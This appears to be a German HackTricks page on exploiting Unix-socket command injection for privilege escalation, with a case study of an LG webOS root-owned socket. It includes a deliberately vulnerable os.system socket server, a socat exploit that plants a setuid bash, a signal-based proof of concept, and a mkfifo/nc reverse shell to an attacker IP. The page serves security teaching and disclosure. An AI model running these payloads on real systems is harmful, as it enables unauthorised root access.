# Socket Command Injection

## Beispiel für Socket-Binding mit Python

Im folgenden Beispiel wird ein **unix socket erstellt** (`/tmp/socket_test.s`), und alles, was **empfangen** wird, wird von `os.system` **ausgeführt**. Ich weiß, dass du so etwas nicht in freier Wildbahn finden wirst, aber das Ziel dieses Beispiels ist zu sehen, wie Code aussieht, der unix sockets verwendet, und wie Eingaben im schlimmstmöglichen Fall verarbeitet werden.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Führe** den Code mit Python aus: `python s.py` und **prüfe, wie der Socket lauscht**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Fallstudie: Durch Signale ausgelöste Eskalation über einen root-owned UNIX-Socket (LG webOS)

Einige privilegierte Daemons stellen einen root-owned UNIX-Socket bereit, der nicht vertrauenswürdige Eingaben akzeptiert und privilegierte Aktionen an Thread-IDs und Signale koppelt. Wenn das Protokoll es einem nicht privilegierten Client ermöglicht, zu beeinflussen, welcher native Thread als Ziel verwendet wird, kann möglicherweise ein privilegierter Codepfad ausgelöst und eine Rechteausweitung erreicht werden.<sup>[[1]](#references)[[2]](#references)</sup>

Die primäre Ausarbeitung und der Disclosure beschreiben die folgende Sequenz.<sup>[[1]](#references)[[2]](#references)</sup>

Beobachtetes Muster:
- Mit einem root-owned Socket verbinden (z. B. /tmp/remotelogger).
- Einen Thread erstellen und dessen native Thread-ID (TID) ermitteln.
- Die (gepackte) TID zusammen mit Padding als Anfrage senden; eine Bestätigung empfangen.
- Ein bestimmtes Signal an diese TID senden, um das privilegierte Verhalten auszulösen.

Der verkürzte PoC unten bildet diese Sequenz nach.<sup>[[1]](#references)[[2]](#references)</sup>
Minimale PoC-Skizze:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Um dies in eine Root-Shell umzuwandeln, kann ein einfaches Named-Pipe- + nc-Muster verwendet werden.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- Diese Klasse von Bugs entsteht, wenn aus dem Status eines unprivilegierten Clients abgeleitete Werte (TIDs) als vertrauenswürdig behandelt und an privilegierte Signal-Handler oder Logik gebunden werden.<sup>[[1]](#references)</sup>
- Zur Absicherung sollten Credentials auf dem Socket erzwungen, Nachrichtenformate validiert und privilegierte Vorgänge von extern bereitgestellten Thread-IDs entkoppelt werden.

## References

- [1] [webOS zum Spaß jailbreaken (nur zum Spaß)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
